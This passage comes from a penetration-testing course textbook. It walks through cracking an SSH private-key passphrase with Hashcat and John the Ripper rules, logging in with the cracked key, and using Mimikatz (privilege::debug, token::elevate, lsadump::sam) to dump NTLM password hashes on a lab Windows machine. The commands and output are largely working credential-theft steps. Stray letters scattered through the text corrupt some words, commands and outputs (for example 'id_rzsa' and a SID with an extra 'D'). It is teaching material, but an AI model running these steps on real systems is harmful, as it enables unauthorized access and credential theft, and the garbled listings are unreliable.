639 (Wikipedia, 2022), https://en.wikipedia.org/wiki/SHA-2
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 406
Made in Morocco
Penetration Testing with Kali Linux
c $1 $3 $7 $@
c $1 $3 $7 $#
Listing 284 - Contents of the ssh.rule rules file
Next, we’ll create a wordlist file containing the passwords from note.txt and save the output to
ssh.passwords.
kali@kali:~/passwordattacks$ cat ssh.passwords
Window
rickc137
dave
superdave
megadave
umbrella
Listing 285 - Contents of the ssh.passwords wordlist
y
Now we can use Hashcat to perform the cracking by specifying the rules file, the wordlist, and the
mode.
k
kali@kali:~/passwordattacks$ hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --
force
s
hashcat (v6.2.5) starting
...
o
Hashfile 'ssh.hash' on line 1 ($sshng...cfeadfb412288b183df308632$16$486): Token
length exception
No hashes loaded. n
...
Listing 286 - Failed cracking attempt with Hashcat
i
Unfortunately, we receive an errozr indicating that our hash caused a “Token length exception”.
When we research this with a search engine, several discussions640 suggest that modern private
keys and their corresponding passphrases are created with the aes-256-ctr641 cipher, which
D
Hashcat’s mode 22921 does not support.
This reinforces the benefit of using multiple tools since John the Ripper (JtR) can handle this
cipher.
To be able to use the previously created rules in JtR, we need to add a name for the rules and
append them to the /etc/john/john.conf configuration file. For this demonstration, we’ll name the
rule sshRules with a “List.Rules” rule naming syntax (as shown in Listing 287). We’ll use sudo and
sh -c to append the contents of our rule file into /etc/john/john.conf.
kali@kali:~/passwordattacks$ cat ssh.rule
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
kali@kali:~/passwordattacks$ sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >>
/etc/john/john.conf'
640 (Hashcat Forum, 2022), https://hashcat.net/forum/thread-10662.html
641 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#CTR
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 407
Made in Morocco
Penetration Testing with Kali Linux
Listing 287 - Adding the named rules to the JtR configuration file
Now that we’ve successfully added our sshRules to the JtR configuration file, we can use john to
crack the passphrase in the final step of our methodology. We’ll define our wordlist with --
wordlist=ssh.passwords, select the previously created rule with --rules=sshRules, and provide the
hash of the private key as the final argument, ssh.hash.
kali@kali:~/passwordattacks$ john --wordlist=ssh.passwords --rules=sshRules ssh.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Umbrella137! (?)
1g 0:00:00:00 DONE (2022-05-30 11:19) 1.785g/s 32.14p/s 32.14yc/s 32.14C/s
Window137!..Umbrella137#
Use the "--show" option to display all of the cracked passwords reliably
k
Session completed.
Listing 288 - Cracking the hash with JtR
s
We successfully cracked the private key passphrase! Excellent!
As expected, the “Umbrella137!” password satisfioed the password policy requirements and also
matched dave’s personal preferences and habits. This is no surprise, since users rarely change
their password patterns.
n
Now, let’s use the passphrase to connect to the target system via SSH.
i
kali@kali:~/passwordattacks$ ssh -i id_rsa -p 2222 PI:EMAIL
Enter passphrase for key 'id_rzsa':
Welcome to Alpine!
D
The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See .
You can setup the system with the command: setup-alpine
You may change this message by editing /etc/motd.
0d6d28cfbd9c:~$
Listing 289 - Entering Passphrase to connect to the target system with SSH
We successfully connected to the target system by providing the correct passphrase to the
private key.
In this section, we again executed the password cracking methodology and reinforced the idea of
careful detail to human behavior patterns. We adapted to an error in our main tool (Hashcat) by
using another tool (JtR) instead. In the following Learning Unit, we’ll discuss Windows-based hash
implementations and demonstrate attacks against them.
13.3 Working with Password Hashes
This Learning Unit covers the following Learning Objectives:
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 408
Made in Morocco
Penetration Testing with Kali Linux
• Obtain and crack NTLM hashes
• Pass NTLM hashes
• Obtain and crack Net-NTLMv2 hashes
• Relay Net-NTLMv2 hashes
In real-life penetration tests we will often gain privileged access to a system and can leverage
those privileges to extract password hashes from the operating system. We can also make and
intercept Windows network authentication requests and use them in further attacks like pass-the-
hash642 or in relay attacks.643
While in most assignments we’ll face an Active Directory environment, this
Learning Unit only covers local Windows machines. Howevery, the skills learned
here are a stepping stone to the later Active Directory Modules in this course.
k
In this Learning Unit, we’ll demonstrate how to obtain hashes from the Windows operating
s
system. We’ll show how we can crack these hashes or use them to gain access to other systems.
For this, we’ll cover two different hash implementations on Windows: NT LAN Manager (NTLM)644
hash and Net-NTLMv2.645 o
13.3.1 Cracking NTLM
n
Before we begin cracking NTLM hashes, let’s discuss the NTLM hash implementation and how it
is used. Then, we’ll demonstrate howi we can obtain and crack NTLM hashes in Windows.
z
Windows stores hashed user passwords in the Security Account Manager (SAM)646 database file,
which is used to authenticate local or remote users.
D
To deter offline SAM database password attacks, Microsoft introduced the
SYSKEY feature in Windows NT 4.0 SP3, which partially encrypts the SAM file.
The passwords can be stored in two different hash formats: LAN Manager
(LM)647 and NTLM. LM is based on DES,648 and is known to be very weak. For
example, passwords are case insensitive and cannot exceed fourteen characters.
If a password exceeds seven characters, it is split into two strings, each hashed
separately. LM is disabled by default beginning with Windows Vista and Windows
Server 2008.
642 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Pass_the_hash
643 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Relay_attack
644 (Wikipedia, 2022), https://en.wikipedia.org/wiki/NT_LAN_Manager
645 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/5e550938-91d4-
459f-b67d-75d70009e3f3
646 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Security_Account_Manager
647 (Wikipedia, 2022), https://en.wikipedia.org/wiki/LAN_Manager
648 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Data_Encryption_Standard
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 409
Made in Morocco
Penetration Testing with Kali Linux
On modern systems, the hashes in the SAM are stored as NTLM hashes. This hash
implementation addresses many weaknesses of LM. For example, passwords are case-sensitive
and are no longer split into smaller, weaker parts. However, NTLM hashes stored in the SAM
database are not salted.
Salts649 are random bits appended to a password before it is hashed. They are used to prevent an
attack in which attackers pre-compute a list of hashes and then perform lookups on these
precomputed hashes to infer the plaintext password. A list or table of precomputed passwords is
called a Rainbow Table650 and the corresponding attack is called a Rainbow Table Attack.
We use “NTLM hash” to refer to the formally correct NTHash. Since “NTLM hash”
is more commonly used in our industry, we use it in this course to avoid
confusion.
y
k
We cannot just copy, rename, or move the SAM database from
C:\Windows\system32\config\sam while the Windows operating system is running because the
kernel keeps an exclusive file system lock on the file. s
Fortunately, we can use the Mimikatz651 tool to do the heavy lifting for us and bypass this
o
restriction. Mimikatz provides the functionality to extract plain-text passwords and password
hashes from various sources in Windows and leverage them in further attacks like pass-the-
hash.652 Mimikatz also includes the sekurlsna module, which extracts password hashes from the
Local Security Authority Subsystem (LSASS)653 process memory. LSASS is a process in Windows
that handles user authentication, password changes, and access token654 creation.
i
LSASS is important for us becausze it caches NTLM hashes and other credentials, which we can
extract using the sekurlsa Mimikatz module. We need to understand that LSASS runs under the
SYSTEM user and is therefoDre even more privileged than a process started as Administrator.
Due to this, we can only extract passwords if we are running Mimikatz as Administrator (or
higher) and have the SeDebugPrivilege655 access right enabled. This access right grants us the
ability to debug not only processes we own, but also all other users’ processes.
We can also elevate our privileges to the SYSTEM account with tools like PsExec656 or the built-in
Mimikatz token elevation function657 to obtain the required privileges. The token elevation function
649 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Salt_(cryptography)
650 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Rainbow_table
651 (Github, 2022), https://github.com/gentilkiwi/mimikatz
652 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Pass_the_hash
653 (Wikipedia, 2022), https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service
654 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens
655 (Microsoft Devblogs, 2008), https://devblogs.microsoft.com/oldnewthing/20080314-00/?p=23113
656 (Microsoft Documentation, 2021), https://docs.microsoft.com/en-us/sysinternals/downloads/psexec
657 (Github, 2015), https://github.com/gentilkiwi/mimikatz/wiki/module-~-token
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 410
Made in Morocco
Penetration Testing with Kali Linux
requires the SeImpersonatePrivilege658 access right to work, but all local administrators have it by
default.
Now that we have a basic understanding of what NTLM hashes are and where we can find them,
let’s demonstrate obtaining and cracking them.
We’ll retrieve passwords from the SAM of the MARKETINGWK01 machine at 192.168.50.210. We
can log in to the system via RDP as user offsec, using lab as the password.
We’ll begin by using Get-LocalUser659 to check which users exist locally on the system.
PS C:\Users\offsec> Get-LocalUser
Name Enabled Description
---- ------- -----------
Administrator False Built-in account for administeringy the computer/domain
DefaultAccount False A user account managed by the system.
Guest False Built-in account for guest access to the computer/domain
k
nelly True
offsec True
WDAGUtilityAccount False A user account managed sand used by the system for Windows
Defender Application Guard scen...
...
o
Listing 290 - Showing all local users in PowerShell
The output of Listing 290 indicates the existence of another user named nelly on the
n
MARKETINGWK01 system. Our goal in this example is to obtain nelly’s plain text password by
retrieving the NTLM hash and cracking it.
i
We already know that the credentials of users are stored when they log on to a Windows system,
z
but credentials are also stored in other ways. For example, the credentials are also stored when a
service is run with a user account.
D
We’ll use Mimikatz (located at C:\tools\mimikatz.exe) to check for stored credentials on the
system. Let’s start PowerShell as administrator by clicking on the Windows icon in the taskbar
and typing “powershell”. We’ll select Windows PowerShell and click on Run as Administrator as
shown in the following figure. We’ll confirm the User Account Control (UAC) popup window by
clicking on Yes.
658 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-
security/seimpersonateprivilege-secreateglobalprivilege
659 (Microsoft Documentation, 2022), https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.localaccounts/get-
localuser
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 411
Made in Morocco
Penetration Testing with Kali Linux
y
k
s
o
n
Figure 218: Start PowerShell as Administrator
In the PowerShell window, we’ll chanige to C:\tools and start Mimikatz.
z
PS C:\Windows\system32> cd C:\tools
D
PS C:\tools> ls
Directory: C:\tools
Mode LastWriteTime Length Name
---- ------------- ------ ----
-a---- 5/31/2022 12:25 PM 1355680 mimikatz.exe
PS C:\tools> .\mimikatz.exe
.#####. mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
.## ^ ##. "A La Vie, A L'Amour" - (oe.eo)
## / \ ## /*** Benjamin DELPY `gentilkiwi` ( PI:EMAIL )
## \ / ## > https://blog.gentilkiwi.com/mimikatz
'## v ##' Vincent LE TOUX ( PI:EMAIL )
'#####' > https://pingcastle.com / https://mysmartlogon.com ***/
mimikatz #
Listing 291 - Starting Mimikatz
PWK - Copyright © 2023 OffSec Services Limited. All rights reserved. 412
Made in Morocco
Penetration Testing with Kali Linux
According to the prompt, Mimikatz is running and we can interact with it through its command-
line environment. Each command consists of a module and a command delimited by two colons,
for example, privilege::debug.
We can use various commands to extract passwords from the system. One of the most common
Mimikatz commands is sekurlsa::logonpasswords, which attempts to extract plaintext passwords
and password hashes from all available sources. Since this generates a huge amount of output,
we’ll instead use lsadump::sam, which will extract the NTLM hashes from the SAM. For this
command, we must first enter token::elevate to elevate to SYSTEM user privileges.
For both commands, sekurlsa::logonpasswords and lsadump::sam, we must have the
SeDebugPrivilege access right enabled, which we’ll accomplish with privilege::debug.
mimikatz # privilege::debug
Privilege '20' OK
y
mimikatz # token::elevate
Token Id : 0 k
User name :
SID name : NT AUTHORITY\SYSTEM
s
656 {0;000003e7} 1 D 34811 NT AUTHORITY\SYSTEM S-1-5-18
(04g,21p) Primary o
-> Impersonated !
* Process Token : {0;000413a0} 1 F 6146616 MARKETINGWK01\offsec S-1-5-21-
4264639230-2296035194-3358247000-1001 n(14g,24p) Primary
* Thread Token : {0;000003e7} 1 D 6217216 NT AUTHORITY\SYSTEM S-1-5-18
(04g,21p) Impersonation (Delegation)
i
mimikatz # lsadump::sam z
Domain : MARKETINGWK01
SysKey : 2a0e15573f9ce6cdd6a1c62d222035d5
Local SID : S-1-5-21-4264D639230-2296035194-3358247000
RID : 000003e9 (1001)
User : offsec
Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
RID : 000003ea (1002)
User : nelly
Hash NTLM: 3ae8e5f0ffabb3a627672e1600f1ba10